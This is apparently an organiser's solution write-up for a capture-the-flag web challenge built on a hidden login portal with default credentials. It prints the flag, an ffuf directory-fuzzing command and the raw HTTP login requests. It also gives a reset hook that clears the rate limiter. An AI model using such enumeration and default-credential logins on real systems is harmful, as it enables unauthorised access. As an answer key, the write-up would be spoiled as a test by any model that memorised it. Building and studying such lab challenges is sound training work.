# Challenge 04 — The Employee Portal (Organiser Write-Up)

## Challenge Details
- **Challenge ID:** 4
- **Name:** The Employee Portal
- **Tier:** Progressive
- **Points:** 15
- **Category:** Web / Broken Authentication
- **Flag:** `ROOT{3mpl0y33_p0rt4l_d3f4ult_cr3ds_881a}`
- **Credentials:** `admin` / `admin123`
- **Hidden Endpoint:** `/portal`

---

## Precise Mechanism
1. The root page (`/`) is an unlinked generic gateway with no references to the login portal.
2. The login portal is located at `/portal`, discoverable via standard directory fuzzing (e.g., `gobuster`, `ffuf`, or `dirsearch` with common wordlists like `common.txt` or `raft-small-words.txt`).
3. The authentication form is protected by common default credentials: `admin` / `admin123`.
4. The login endpoint is throttled by a rate limiter (5 attempts per 10s per IP) to prevent unconstrained fuzzing.
5. Successful login establishes an authenticated session cookie (`veyra_portal_session`) and displays the internal staff dashboard displaying the flag.

---

## Exact Triggering Input & Solution Steps

### Step 1: Directory Enumeration
Fuzz for endpoints:
```bash
ffuf -u http://challenge-04-host/FUZZ -w common.txt -mc 200
```
Discovers: `http://challenge-04-host/portal`

### Step 2: Authentication
Submit default credentials to `/portal/login`:
```http
POST /portal/login HTTP/1.1
Host: challenge-04-host
Content-Type: application/x-www-form-urlencoded

username=admin&password=admin123
```
**Expected Output (HTTP 302 Found):**
Redirects to `/portal/dashboard` with cookie `Set-Cookie: veyra_portal_session=s%3Aadmin...`.

### Step 3: View Dashboard & Flag
```http
GET /portal/dashboard HTTP/1.1
Host: challenge-04-host
Cookie: veyra_portal_session=...
```
**Extracted Flag:** `ROOT{3mpl0y33_p0rt4l_d3f4ult_cr3ds_881a}`

---

## Reset Procedure
- **Hook:** `POST /reset/4`
- **Headers:** `Authorization: Bearer <RESET_TOKEN>`
- **Action:** Clears Redis and in-memory rate-limiting counters.
- **Expected Response (HTTP 200 OK):**
  ```json
  {
    "status": "ok",
    "challenge_id": 4,
    "reset_at": "...",
    "message": "Rate limit counters cleared successfully."
  }
  ```
